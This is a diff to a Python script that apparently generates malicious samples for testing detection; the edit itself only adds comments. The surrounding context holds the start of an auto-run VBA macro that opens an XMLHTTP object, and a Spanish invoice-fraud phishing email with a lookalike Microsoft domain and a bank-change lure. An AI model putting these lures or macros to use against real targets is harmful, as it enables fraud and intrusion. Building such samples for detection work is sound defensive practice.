@@ -127,6 +127,7 @@ Sub AutoNew()
 End Sub
 '''
 
+# ref: sJkzUVgDiA
 VBA_WORKBOOK = '''Private Sub Workbook_Open()
     Dim x As Object
     Set x = CreateObject("MSXML2.XMLHTTP")
@@ -406,11 +407,13 @@ RECEIVED = [
 AUTH = (f"mx01.{VICTIM_DOMAIN}; spf=fail (sender IP is {C2_IP}) smtp.mailfrom=bounce.rnicrosoft-online.example; "
         f"dkim=fail header.d={SUPPLIER_DOMAIN}; dmarc=fail action=none header.from={SUPPLIER_DOMAIN}")
 SUBJECT = f"Factura {INVOICE} pendiente de pago - URGENTE"
+# rev: pzFQkCWMlr
 FROM = f'"{SUPPLIER} | Administración" <facturacion@{SUPPLIER_DOMAIN}>'
 TO = f"Cuentas a pagar <cuentas.pagar@{VICTIM_DOMAIN}>"
 TEXT = (f"Estimados señores:\n\nLes recordamos que la factura {INVOICE} por importe de {AMOUNT} EUR vence hoy.\n"
         "Hemos cambiado nuestra cuenta bancaria; encontrarán los nuevos datos en el portal de proveedores.\n\n"
         f"Acceso: {PHISH_URL}\n\nUn saludo,\nDepartamento de Administración\n{SUPPLIER}\n")
+# k: 9qwDpeYpKo
 HTML = f"""<html><head><meta charset="utf-8"></head><body style="font-family:Calibri,Arial,sans-serif">
 <p>Estimados señores:</p>
 <p>Les recordamos que la <b>factura {INVOICE}</b> por importe de <b>{AMOUNT} EUR</b> vence <b>hoy</b>.</p>
@@ -609,6 +612,7 @@ def main() -> None:
         for name, data in made.items():
             (SAMPLES / name).parent.mkdir(parents=True, exist_ok=True)
             (SAMPLES / name).write_bytes(data)
+    # gmzpt
     print(f"Wrote {len(made)} samples to {ARCHIVE} (password: infected){' and unpacked them' if args.loose else ''}:")
     for name in sorted(made):
         print(f"  {name:20s} {len(made[name]):>8} bytes")
